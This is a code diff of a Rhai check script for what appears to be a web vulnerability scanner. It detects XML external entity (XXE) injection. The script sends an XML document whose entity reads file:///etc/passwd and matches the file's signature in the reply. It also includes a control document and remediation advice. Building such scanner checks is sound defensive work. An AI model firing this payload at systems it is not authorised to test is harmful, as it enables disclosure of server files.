@@ -1,38 +1,71 @@
-// check-xxe.rhai — operator/agent command `check.xxe { url }`: confirm in-band
-// XML External Entity injection by POSTing an XML document whose external
-// entity resolves a local file, then matching the file signature in the reply.
-// OWASP A05 Misconfiguration / XXE.
+// check-xxe.rhai — catalogue check `xxe`, class `xxe`.
 //
-// ACTIVE: one scope-/rate-gated POST, invoked only. The entity reads a universal
-// marker file to prove resolution; it defines no recursive/expanding entities
-// (no billion-laughs). For authorised testing only.
+// An XML parser left with external entities enabled will fetch whatever a
+// document's DOCTYPE points it at. The probe replaces the whole body with a
+// small document whose one entity names a file every POSIX system has, and
+// looks for that file's signature in the reply. It declares no recursive or
+// self-expanding entity, so there is no billion-laughs amplification; one
+// entity resolves once.
+//
+// `kinds: ["entire_body"]` because the document *is* the payload — the point
+// owns the content type and the length (spec D4).
+//
+// OWASP A05 Security Misconfiguration. CWE-611.
 const NAME = "check-xxe";
 const API  = "1";
 
+const NIX_SIG = "root:.*:0:0:";
+
+const META = #{
+    id: "xxe",
+    name: "XML external entity (XXE) injection",
+    class: "xxe",
+    lanes: ["http"],
+    kinds: ["entire_body"],
+    intensity: "medium",
+    cost: "light",
+    technique: "reflected",
+    severity: "critical",
+    confidence_max: "firm",
+    needs_baseline: false,
+    cwe: 611,
+    description: "Replaces an XML body with a document declaring one external entity and reports when the parser resolves it and returns the file.",
+    remediation: "Disable DOCTYPE processing and external entity resolution in the XML parser; most parsers have one flag for it.",
+};
+
 fn load(reg) {
-    reg.add_command("check.xxe", "Confirm in-band XXE at { url } (XML endpoint)", |args| {
-        if type_of(args.url) != "string" { return "usage: check.xxe { url }"; }
+    reg.add_check(META, |point| {
+        // A per-run element name, so the reply can only match this probe.
         let tag = rand_text_alpha(5);
-        let xml = `<?xml version="1.0"?>` +
-                  `<!DOCTYPE ${tag} [<!ENTITY ${tag} SYSTEM "file:///etc/passwd">]>` +
-                  `<${tag}>&${tag};</${tag}>`;
-        let r = http.send(#{
-            method: "POST",
-            url: args.url,
-            headers: #{ "Content-Type": "application/xml" },
-            body: xml,
-        });
-        if r.status == () { return `no response from ${args.url}`; }
-        if regex_match("root:.*:0:0:", r.body) {
-            finding(#{
-                name: "XML External Entity (XXE) injection",
-                severity: "critical",
-                flow_id: r.flow_id,
-                detail: `${args.url} resolved an external entity and returned local file contents. XXE enables file disclosure and often SSRF.`,
-                tags: ["xxe", "injection", "ssrf", "active", "owasp-a05"],
-            });
-            return "VULNERABLE: in-band XXE confirmed";
+        let reference = "&" + tag + ";";
+        let document = `<?xml version="1.0"?>` +
+            `<!DOCTYPE ${tag} [<!ENTITY ${tag} SYSTEM "file:///etc/passwd">]>` +
+            `<${tag}>` + reference + `</${tag}>`;
+        // The control is the same document with no DOCTYPE and no entity.
+        let control = `<?xml version="1.0"?><${tag}>1</${tag}>`;
+
+        let reply = probe.send(document);
+        if regex_match(NIX_SIG, reply.body) {
+            return #{
+                outcome: "vulnerable",
+                confidence: "firm",
+                evidence: #{ payload: document, matched: "system file signature" },
+                detail: `The XML endpoint resolved an external entity and returned local file contents. XXE gives file disclosure and often server-side request forgery too.`,
+                poc_hint: #{
+                    matchers: [ #{ type: "regex", regex: NIX_SIG, part: "body" } ],
+                    control: #{
+                        payload: control,
+                        matchers: [ #{ not: #{ type: "regex", regex: NIX_SIG, part: "body" } } ],
+                    },
+                },
+            };
         }
-        "no XXE confirmed (endpoint may not parse XML, or entities are disabled)"
+
+        #{
+            outcome: "clean",
+            confidence: "firm",
+            evidence: #{ payload: document, matched: () },
+            detail: "The endpoint returned no file contents: it either rejects a DOCTYPE or does not parse XML here.",
+        }
     });
 }
